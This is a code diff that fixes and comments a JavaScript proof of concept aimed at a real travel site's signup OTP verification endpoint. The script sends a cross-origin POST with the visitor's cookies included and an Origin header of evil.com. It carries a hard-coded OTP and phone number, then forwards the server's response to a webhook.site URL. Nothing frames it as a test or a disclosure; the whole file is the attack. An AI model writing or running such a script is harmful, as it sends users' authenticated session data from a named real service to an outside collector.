@@ -1,29 +1,29 @@
 <script>
+   // Start the fetch request
    fetch("https://mapi.makemytrip.com/ext/web/pwa/verify/token/SIGNUP_OTP?region=us&currency=usd&user-currency=USD&language=eng", {
-      method: 'POST',
-    credentials: 'include',
-    headers: {
-        'Content-Type': 'application/json',
-        'Origin': 'https://evil.com'
-    },
-    body: JSON.stringify({
-        type: 6,
-        token: "100017",
-        mobileNumber: "56186761",
-        countryCode: "216"
-    })  // This will send the user's cookies
-   
-   .then(response => response.text())
-   .then(data => {
-     fetch("https://webhook.site/84296d9c-f7fd-4f43-b7b4-2f7e894caec5", {  // Replace with your webhook
-       method: "POST",
-       headers: { "Content-Type": "application/json" },
-       body: JSON.stringify({ token: data })
-     });
+       method: 'POST',
+       credentials: 'include', // Include cookies in the request
+       headers: {
+           'Content-Type': 'application/json',
+           'Origin': 'https://evil.com' // Set origin to simulate a CORS request
+       },
+       body: JSON.stringify({
+           type: 6,
+           token: "100017",
+           mobileNumber: "56186761",
+           countryCode: "216"
+       })
    })
-   .catch(error => console.error("Error:", error))
-  
-     })
-    
- </script>
- 
+   .then(response => response.text()) // Convert the response to text
+   .then(data => {
+       // Send the data received from the first request to the webhook
+       return fetch("https://webhook.site/84296d9c-f7fd-4f43-b7b4-2f7e894caec5", {
+           method: "POST",
+           headers: { "Content-Type": "application/json" },
+           body: JSON.stringify({ token: data }) // Send received data as JSON
+       });
+   })
+   .then(response => response.text()) // Optional: Handle response from the webhook
+   .then(result => console.log('Webhook response:', result))
+   .catch(error => console.error("Error:", error)); // Catch and log any errors in the chain
+</script>
